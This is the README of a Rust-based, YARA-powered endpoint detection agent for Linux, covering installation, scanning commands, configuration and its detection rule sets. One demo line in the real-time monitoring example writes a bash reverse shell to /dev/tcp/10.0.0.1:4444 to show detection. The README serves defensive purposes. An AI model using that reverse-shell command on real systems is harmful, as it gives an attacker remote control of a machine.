<p align="center">
  <img src="assets/banner.svg" alt="YARA-EDR Banner" width="800"/>
</p>

<p align="center">
  <a href="#features"><strong>Features</strong></a> ·
  <a href="#installation"><strong>Installation</strong></a> ·
  <a href="#quick-start"><strong>Quick Start</strong></a> ·
  <a href="#configuration"><strong>Configuration</strong></a> ·
  <a href="#detection-rules"><strong>Rules</strong></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/rust-stable-orange?logo=rust" alt="Rust"/>
  <img src="https://img.shields.io/badge/platform-linux-blue?logo=linux&logoColor=white" alt="Linux"/>
  <img src="https://img.shields.io/badge/rules-1775+-green" alt="Rules"/>
  <img src="https://img.shields.io/badge/license-MIT-purple" alt="License"/>
</p>

---

A fast, lightweight Endpoint Detection and Response (EDR) agent for Linux, powered by YARA rules. Written in Rust for maximum performance and safety.

## Features

- **Real-time File Monitoring** - inotify-based file system monitoring with configurable watch paths
- **On-demand Scanning** - Scan files, directories, or entire filesystems
- **Process Scanning** - Scan running processes and their memory
- **1750+ Detection Rules** - Comprehensive Linux malware and threat detection out of the box
- **Quarantine System** - Isolate detected threats with metadata preservation
- **Configurable Responses** - Auto-quarantine, process termination, alerts
- **Low Resource Usage** - Efficient Rust implementation with minimal overhead
- **Hot Rule Reloading** - Update rules without restarting the service

## Installation

### Prerequisites

- Linux (kernel 2.6.13+ for inotify support)
- YARA library (libyara.so)

### Install YARA Library

```bash
# Arch Linux
yay -S yara

# Ubuntu/Debian
sudo apt install libyara-dev

# From source
git clone https://github.com/VirusTotal/yara.git
cd yara
./bootstrap.sh
./configure
make && sudo make install
sudo ldconfig
```

### Install YARA-EDR

#### From Release

```bash
# Download latest release
wget https://github.com/anubhavg-icpl/yara-edr/releases/latest/download/yara-edr-linux-amd64.tar.gz
tar -xzf yara-edr-linux-amd64.tar.gz
sudo mv yara-edr /usr/local/bin/

# Create directories
sudo mkdir -p /var/lib/yara-edr/quarantine
sudo mkdir -p /var/log/yara-edr
```

#### From Source

```bash
# Clone repository
git clone https://github.com/anubhavg-icpl/yara-edr.git
cd yara-edr

# Build release binary
cargo build --release

# Install
sudo cp target/release/yara-edr /usr/local/bin/
```

## Quick Start

```bash
# Scan a file
yara-edr scan /path/to/file

# Scan a directory
yara-edr scan /home/user/downloads

# Scan a running process
yara-edr scan-process 1234

# Validate configuration and rules
yara-edr validate

# Start daemon mode (real-time monitoring)
sudo yara-edr start
```

## Usage

### Command Line Interface

```
yara-edr [OPTIONS] <COMMAND>

Commands:
  scan          Scan files or directories for malware
  scan-process  Scan a running process by PID
  validate      Validate configuration and YARA rules
  start         Start the EDR daemon (real-time monitoring)
  stop          Stop the EDR daemon
  status        Show daemon status
  quarantine    Manage quarantined files

Options:
  -c, --config <FILE>  Path to configuration file [default: /etc/yara-edr/config.toml]
  -v, --verbose        Enable verbose output
  -h, --help           Print help
  -V, --version        Print version
```

### Scanning Files

```bash
# Scan a single file
yara-edr scan /tmp/suspicious_file.bin

# Scan multiple files
yara-edr scan file1.exe file2.sh file3.elf

# Scan a directory recursively
yara-edr scan /var/www/html

# Scan with custom config
yara-edr -c /path/to/config.toml scan /home
```

### Scanning Processes

```bash
# Scan a specific process
yara-edr scan-process 1234

# Scan current shell
yara-edr scan-process $$
```

### Quarantine Management

```bash
# List quarantined files
yara-edr quarantine list

# Show quarantine statistics
yara-edr quarantine stats

# Restore a quarantined file
yara-edr quarantine restore <quarantine-id>

# Delete a quarantined file permanently
yara-edr quarantine delete <quarantine-id>
```

### Daemon Mode

```bash
# Start real-time monitoring
sudo yara-edr start

# Start in foreground (for debugging)
sudo yara-edr start --foreground

# Check status
yara-edr status

# Stop daemon
sudo yara-edr stop
```

## Configuration

Default configuration file: `/etc/yara-edr/config.toml`

```toml
[general]
# Log level: trace, debug, info, warn, error
log_level = "info"
# Path to log file
log_file = "/var/log/yara-edr/edr.log"
# PID file for daemon mode
pid_file = "/var/run/yara-edr.pid"
# Number of worker threads (0 = auto-detect)
workers = 0

[rules]
# Paths to search for YARA rules
paths = ["./rules", "/etc/yara-edr/rules"]
# Enable automatic rule reloading
auto_reload = true
# Interval in seconds between rule reload checks
reload_interval = 300
# Scan timeout in seconds
scan_timeout = 60

[file_monitor]
# Enable file monitoring
enabled = true
# Paths to watch for file changes
watch_paths = ["/home", "/tmp", "/var/tmp", "/opt"]
# Enable recursive watching
recursive = true
# File extensions to scan (empty = all files)
extensions = ["exe", "dll", "so", "sh", "py", "pl", "rb", "bin", "elf"]
# Patterns to exclude from scanning
exclude_patterns = ["/proc/*", "/sys/*", "/dev/*", "*.log", "*.tmp"]
# Maximum file size to scan in bytes (0 = unlimited)
max_file_size = 104857600  # 100 MB
# Debounce time in milliseconds for file events
debounce_ms = 500

[process_monitor]
# Enable process monitoring
enabled = true
# Scan processes on execution
scan_on_exec = true
# Interval in seconds for periodic process scanning
scan_interval = 3600
# Enable memory scanning
memory_scan = true
# Scan command line arguments
scan_cmdline = true
# Process names to exclude from scanning
exclude_names = ["systemd", "init", "kthreadd"]

[response]
# Path to quarantine directory
quarantine_path = "/var/lib/yara-edr/quarantine"
# Automatically quarantine detected files
auto_quarantine = false
# Automatically kill detected processes
auto_kill = false
# Preserve file metadata in quarantine
preserve_metadata = true

[alerts]
# Alert output type: file, stdout, syslog
output = "file"
# Path to alerts file (when output = file)
file_path = "/var/log/yara-edr/alerts.json"
# Include matched data in alerts
include_match_data = true
# Maximum match data length to include
max_match_data = 256
# Alert severity threshold: info, low, medium, high, critical
severity_threshold = "info"
```

## Detection Rules

YARA-EDR comes with 1775+ detection rules organized by category:

### Rule Files

| File | Rules | Description |
|------|-------|-------------|
| `elastic_linux.yar` | 869 | Elastic Security Linux malware rules |
| `toolkit.yar` | 659 | Hacking and pentesting tool detection |
| `malwatch.yar` | 32 | Webshells, backdoors, PHP malware |
| `linux_privesc.yar` | 27 | Privilege escalation exploits and tools |
| `linux_apt.yar` | 25 | APT and nation-state malware |
| `linux_container.yar` | 25 | Container escapes and cloud attacks |
| `linux_exploits.yar` | 24 | Exploit frameworks and C2 tools |
| `linux_advanced.yar` | 22 | BPFDoor, rootkits, RATs, ransomware |
| `linux_botnet.yar` | 21 | Botnets, worms, and DDoS tools |
| `linux_credentials.yar` | 19 | Credential theft and dumping |
| `community_linux.yar` | 18 | Community Linux/ELF malware rules |
| `linux_fileless.yar` | 16 | Fileless and memory-only attacks |
| `linux.yar` | 16 | Custom Linux threat detection |
| `default.yar` | 5 | EICAR test file and base rules |

### Detection Categories

- **APT/Nation-State** - APT28, APT29, Lazarus, APT41, Turla, Sandworm
- **Kernel Exploits** - DirtyPipe, DirtyCow, PwnKit, Baron Samedit, StackRot
- **Container Security** - Docker escapes, Kubernetes attacks, cloud metadata SSRF
- **C2 Frameworks** - Cobalt Strike, Metasploit, Sliver, Havoc, Mythic
- **Credential Theft** - mimipenguin, LaZagne, SSH key theft, keyloggers
- **Botnets** - Mirai variants, Gafgyt, Hajime, XOR.DDoS, Kaiten, Tsunami
- **Fileless Attacks** - memfd_create, /dev/shm execution, LOLBins
- **Cryptominers** - XMRig, cryptomining botnets
- **Rootkits** - Umbreon, Orbit, eBPF rootkits, LD_PRELOAD
- **Ransomware** - RansomEXX, HelloKitty, Hive, Linux variants
- **Webshells** - PHP webshells, China Chopper, obfuscated code
- **Privilege Escalation** - SUID abuse, sudo misconfig, capability abuse
- **Advanced Backdoors** - BPFDoor, TinyShell, Rekoobe, GTPDOOR
- **RATs** - Pupy, CHAOS RAT, cross-platform implants

### Adding Custom Rules

1. Create a `.yar` file in the rules directory:

```yara
rule My_Custom_Rule {
    meta:
        description = "Detects my custom threat"
        author = "Your Name"
        severity = "high"
        category = "malware"

    strings:
        $s1 = "malicious_string" ascii
        $s2 = { 4D 5A 90 00 }  // hex pattern

    condition:
        any of them
}
```

2. Place it in the rules directory or update `config.toml` to include your path.

3. Validate rules:

```bash
yara-edr validate
```

### Rule Sources

- [Elastic Security](https://github.com/elastic/protections-artifacts) - Enterprise-grade detection
- [YARA-Rules Community](https://github.com/Yara-Rules/rules) - Community-maintained rules
- [Malwatch Signatures](https://github.com/defended-net/malwatch-signatures) - Webshell/backdoor detection
- [Signature-Base](https://github.com/Neo23x0/signature-base) - Florian Roth's collection

## Examples

### Example: Scan Downloads Directory

```bash
$ yara-edr scan ~/Downloads

Scanning: "/home/user/Downloads"
[DETECTION] /home/user/Downloads/suspicious.sh
  Rule: Linux_Backdoor_Reverse_Shell
    description: Detects reverse shell patterns
    severity: high
    category: backdoor
  MD5: a1b2c3d4e5f6...
  SHA256: 1234567890ab...

=== Scan Complete ===
Files scanned: 42
Detections: 1
```

### Example: Real-time Monitoring

```bash
$ sudo yara-edr start
[INFO] Starting YARA-EDR daemon
[INFO] Loading 6 rule files (1599 rules)
[INFO] Watching: /home, /tmp, /var/tmp, /opt
[INFO] File monitor initialized with 127 watches
[INFO] Process monitor started
[INFO] YARA-EDR is running (PID: 12345)

# In another terminal, create a suspicious file
$ echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /tmp/evil.sh

# Alert is generated:
[DETECTION] /tmp/evil.sh
  Rule: Linux_Backdoor_Reverse_Shell
  Action: Quarantined
```

### Example: Process Scanning

```bash
$ yara-edr scan-process 1234

Scanning process: PID 1234
  Name: suspicious_binary
  Path: /tmp/.hidden/miner

[DETECTION] Process 1234
  Rule: Linux_Cryptominer_Xmrig
    description: Detects XMRig cryptocurrency miner
    severity: medium
  Recommendation: Terminate process and investigate
```

## Systemd Service

Create `/etc/systemd/system/yara-edr.service`:

```ini
[Unit]
Description=YARA-EDR Endpoint Detection and Response
After=network.target

[Service]
Type=forking
ExecStart=/usr/local/bin/yara-edr start
ExecStop=/usr/local/bin/yara-edr stop
ExecReload=/bin/kill -HUP $MAINPID
PIDFile=/var/run/yara-edr.pid
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

Enable and start:

```bash
sudo systemctl daemon-reload
sudo systemctl enable yara-edr
sudo systemctl start yara-edr
```

## Building from Source

### Requirements

- Rust 1.70+
- YARA library and headers
- Linux with inotify support

### Build

```bash
# Clone
git clone https://github.com/anubhavg-icpl/yara-edr.git
cd yara-edr

# Build debug
cargo build

# Build release (optimized)
cargo build --release

# Run tests
cargo test

# Install locally
cargo install --path .
```

### Development

```bash
# Run with logging
RUST_LOG=debug cargo run -- scan /tmp

# Run specific test
cargo test test_name

# Check formatting
cargo fmt --check

# Run linter
cargo clippy
```

## Troubleshooting

### YARA library not found

```bash
# Set library path
export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH

# Or add to /etc/ld.so.conf.d/
echo "/usr/local/lib" | sudo tee /etc/ld.so.conf.d/yara.conf
sudo ldconfig
```

### Permission denied on /proc

```bash
# Run with sudo for process memory scanning
sudo yara-edr scan-process 1234
```

### Too many inotify watches

```bash
# Increase limit
echo "fs.inotify.max_user_watches=524288" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

### High CPU usage

Reduce watched paths or increase debounce time in config:

```toml
[file_monitor]
watch_paths = ["/home"]  # Reduce paths
debounce_ms = 1000       # Increase debounce
```

## Contributing

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/my-feature`
3. Commit changes: `git commit -am 'Add my feature'`
4. Push to branch: `git push origin feature/my-feature`
5. Submit a Pull Request

## License

MIT License - see [LICENSE](LICENSE) for details.

## Acknowledgments

- [YARA](https://github.com/VirusTotal/yara) - Pattern matching engine
- [Elastic Security](https://github.com/elastic/protections-artifacts) - Detection rules
- [Malwatch](https://github.com/defended-net/malwatch) - Signature contributions
- [YARA-Rules Community](https://github.com/Yara-Rules/rules) - Community rules

## Support

- GitHub Issues: [Report bugs or request features](https://github.com/anubhavg-icpl/yara-edr/issues)
- Documentation: See `/docs` directory for detailed guides
